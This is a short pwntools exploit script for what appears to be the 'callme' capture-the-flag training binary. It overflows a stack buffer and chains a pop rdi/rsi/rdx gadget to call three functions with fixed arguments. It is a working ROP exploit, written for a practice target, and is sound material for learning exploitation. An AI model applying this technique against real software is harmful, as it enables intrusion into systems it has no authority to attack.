from pwn import *


p = process("./callme")
p.recvuntil(b"> ")

elf = ELF("./callme", checksec=False)

callme_one = elf.symbols["callme_one"]
callme_two = elf.symbols["callme_two"]
callme_three = elf.symbols["callme_three"]

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

argument_gadget = 0x000000000040093c #: pop rdi; pop rsi; pop rdx; ret;
pwnme_ret = 0x400887

offset = 0x20 + 8

payload = b"A"*offset
payload += p64(argument_gadget)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_one)
payload += p64(argument_gadget)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_two)
payload += p64(argument_gadget)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_three)
payload += p64(pwnme_ret)

p.send(payload)
print(p.recvall().decode())